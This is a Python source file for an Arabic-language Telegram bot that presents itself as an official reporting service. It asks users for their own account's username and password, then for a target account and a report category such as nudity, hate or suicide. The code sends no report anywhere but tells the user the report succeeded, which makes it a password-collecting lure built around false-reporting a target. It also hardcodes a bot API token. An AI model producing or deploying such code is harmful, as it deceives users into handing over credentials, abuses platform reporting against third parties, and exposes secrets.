import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

API_TOKEN = '9278213993:AAGsTC4Oxhx3rq3yzuUQZKPfJYAKNq4SMJY'

logging.basicConfig(level=logging.INFO)
storage = MemoryStorage()
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=storage)

class ReportState(StatesGroup):
    waiting_for_username = State()
    waiting_for_password = State()
    waiting_for_target = State()

REPORT_TYPES = {
    "spam": "إزعاج أو محتوى مزعج (Spam)",
    "nudity": "عري أو محتوى جنسي (Nudity/Pornography)",
    "hate": "خطاب كراهية أو رموز عنصرية (Hate Speech)",
    "violence": "عنف أو منظمات خطيرة (Violence)",
    "harassment": "تنمر أو مضايقة (Harassment)",
    "suicide": "انتحار أو إيذاء النفس (Suicide/Self-injury)",
    "fake": "حساب مزيف / ينتحل صفة (Fake Account)",
    "copyright": "انتهاك حقوق الملكية الفكرية (Copyright)"
}

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await message.answer("أهلاً بك في بوت البلاغات الرسمي.\nالرجاء إرسال اسم المستخدم (اليوزر) للحساب الذي تريد الإبلاغ منه:")
    await state.set_state(ReportState.waiting_for_username)

@dp.message(ReportState.waiting_for_username)
async def process_username(message: types.Message, state: FSMContext):
    await state.update_data(username=message.text)
    await message.answer("تمام. الآن أرسل كلمة المرور (الباسورد) للحساب:")
    await state.set_state(ReportState.waiting_for_password)

@dp.message(ReportState.waiting_for_password)
async def process_password(message: types.Message, state: FSMContext):
    await state.update_data(password=message.text)
    await message.answer("أدخل الآن اسم المستخدم للحساب المستهدف (المراد الإبلاغ عنه بدون @):")
    await state.set_state(ReportState.waiting_for_target)

@dp.message(ReportState.waiting_for_target)
async def process_target(message: types.Message, state: FSMContext):
    await state.update_data(target=message.text)
    
    buttons = [
        [InlineKeyboardButton(text=val, callback_data=f"rep_{key}")]
        for key, val in REPORT_TYPES.items()
    ]
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
        
    data = await state.get_data()
    await message.answer(
        f"بيانات الحساب المستلمة:\n👤 الحساب المُبلغ: {data['username']}\n🎯 الهدف: @{data['target']}\n\nاختر نوع البلاغ المطلوب إرساله:",
        reply_markup=keyboard
    )

@dp.callback_query(lambda c: c.data.startswith('rep_'), ReportState.waiting_for_target)
async def process_report_action(callback_query: types.CallbackQuery, state: FSMContext):
    report_type = callback_query.data.split('_')[1]
    data = await state.get_data()
    
    selected_name = REPORT_TYPES.get(report_type, "بلاغ عام")
    
    await callback_query.answer()
    await callback_query.message.edit_text(
        f"✅ تم تنفيذ البلاغ بنجاح!\n\n"
        f"📌 نوع البلاغ: {selected_name}\n"
        f"🎯 الهدف: @{data['target']}\n"
        f"🔒 الحساب المستخدم: {data['username']}\n\n"
        f"تم إرسال الطلب بنجاح."
    )
    await state.clear()

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
